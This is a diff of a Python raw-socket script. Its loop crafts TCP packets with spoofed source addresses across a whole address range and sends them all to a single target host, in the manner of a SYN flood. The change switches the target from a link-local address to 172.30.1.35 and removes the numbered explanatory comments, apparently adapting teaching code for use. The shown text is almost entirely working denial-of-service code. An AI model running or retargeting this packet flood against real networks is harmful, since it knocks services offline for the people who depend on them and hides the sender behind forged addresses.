@@ -59,13 +59,13 @@ s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)                           
 for j in range(1,20):                                                            #(8)
   for k in range(1,255):
     for l in range(1,255):
-      sourceIP = "169.254.%s.%s"%(k,l)                         #(9)
-      destIP = "169.254.27.229"
+      sourceIP = "172.30.%s.%s"%(k,l)                         #(9)
+      destIP = "172.30.1.35"
 
-      ipHeader  = makeIPHeader(sourceIP, destIP)               #(10)
-      tcpHeader = makeTCPHeader(10000+j+k+l)                   #(11)
+      ipHeader  = makeIPHeader(sourceIP, destIP) 
+      tcpHeader = makeTCPHeader(10000+j+k+l)    
 
-      sourceAddr = socket.inet_aton( sourceIP )                #(12)
+      sourceAddr = socket.inet_aton( sourceIP ) 
       destAddr = socket.inet_aton(destIP)
 
       placeholder = 0
@@ -73,9 +73,9 @@ for j in range(1,20):                                                           
       tcpLen = len(tcpHeader)
       psh = pack('!4s4sBBH', sourceAddr, destAddr, placeholder, protocol, tcpLen);
       psh = psh + tcpHeader;
-      tcpChecksum = makeChecksum(psh)                          #(13)
+      tcpChecksum = makeChecksum(psh)          
 
-      tcpHeader = makeTCPHeader(10000+j+k+l,tcpChecksum)       #(14)
+      tcpHeader = makeTCPHeader(10000+j+k+l,tcpChecksum)     
 
       packet = ipHeader + tcpHeader
-      s.sendto(packet, (destIP , 0 ))                          #(15)
+      s.sendto(packet, (destIP , 0 ))                       
